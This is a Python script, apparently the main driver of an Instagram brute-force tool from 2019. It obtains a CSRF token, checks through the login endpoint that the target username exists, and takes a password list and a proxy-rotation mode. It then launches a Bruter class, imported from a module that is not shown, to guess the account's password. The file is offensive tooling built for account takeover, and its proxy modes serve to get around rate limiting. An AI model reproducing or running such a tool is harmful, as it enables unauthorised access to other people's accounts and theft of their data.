# Date: 06/09/2019
# Author: Mohamed
# Description: Instagram brute force program

import os
import requests
import platform
import lib.const as const
from lib.bruter import Bruter

CLEAR_CMD = 'cls' if platform.system() == 'Windows' else 'clear'


def clear() -> None:
    '''Clear the screen.
    '''

    os.system(CLEAR_CMD)


def get_csrftoken() -> str:
    '''Returns a csrftoken.
    '''

    csrftoken = ''

    try:
        csrftoken = requests.get(
            const.CSRFTOKEN_URL
        ).cookies.get_dict()['csrftoken']

    except:
        pass

    return csrftoken


def username_exists(username: str, csrftoken: str) -> bool:
    '''Returns True if a username exists.
    '''

    headers = {
        'x-csrftoken': csrftoken,
        'accept-language': 'en-US,en;q=0.9'
    }

    headers = {
        'x-csrftoken': csrftoken,
        'accept-language': 'en-US,en;q=0.9'
    }

    data = {
        'username': username,
        'password': ' '
    }

    if not len(username.strip()):
        return False

    try:
        resp = requests.post(
            data=data,
            headers=headers,
            url=const.LOGIN_URL,
        ).json()

        return resp['user']
    except:
        print('[!] Please check your internet connection and try again')
        exit()


def get_username(csrftoken: str) -> str:
    '''Returns the username.
    '''

    clear()

    while True:

        try:
            username = input('Enter your username: ')
        except KeyboardInterrupt:
            exit()
        except:
            continue

        if username_exists(username, csrftoken):
            return username
        else:
            print('[!] Username does not exist\n')


def get_passwordlist() -> str:
    '''Returns the path to a password list.
    '''

    clear()

    while True:

        try:
            password_list = input('Enter path to password list: ')
        except KeyboardInterrupt:
            exit()
        except:
            continue

        if os.path.exists(password_list):
            return password_list
        else:
            print('[!] Password list does not exist')


def get_mode() -> int:
    '''Returns the mode to use.
    '''

    clear()

    for i in const.MODES:
        print('{}: => {:02d} proxies at a time'.format(
            i, const.MODES[i]
        ))

    while True:

        try:
            mode = input('\nEnter a mode: ')
        except KeyboardInterrupt:
            exit()

        if not mode.isdigit():
            print('\n[!] Sorry, mode must be a number')
            continue

        mode = int(mode)

        if mode in const.MODES:
            return mode

        if not mode in const.MODES:
            print('\n[!] Sorry, mode must be a number between {} and {}'.format(
                0, len(const.MODES)-1
            ))


def get_verbose() -> bool:
    '''Returns True if the user wants to verbose mode.
    '''

    clear()

    try:
        verbose = input('Would you like to enable verbose mode? [Y/n]: ')

        if verbose.lower() == 'y':
            return True

    except KeyboardInterrupt:
        exit()

    return False


def pause() -> None:
    '''Pause the program.
    '''

    try:
        input('\nPress Enter to Continue')
    except KeyboardInterrupt:
        exit()


def main():

    csrftoken = get_csrftoken()

    if not csrftoken:
        print('[!] Please check your internet connection and try again')
        exit()

    username = get_username(csrftoken)
    passlist = get_passwordlist()
    threads = const.MODES[get_mode()]
    verbose = get_verbose()

    Bruter(username, passlist, threads, verbose).start()
    pause()


if __name__ == '__main__':
    main()
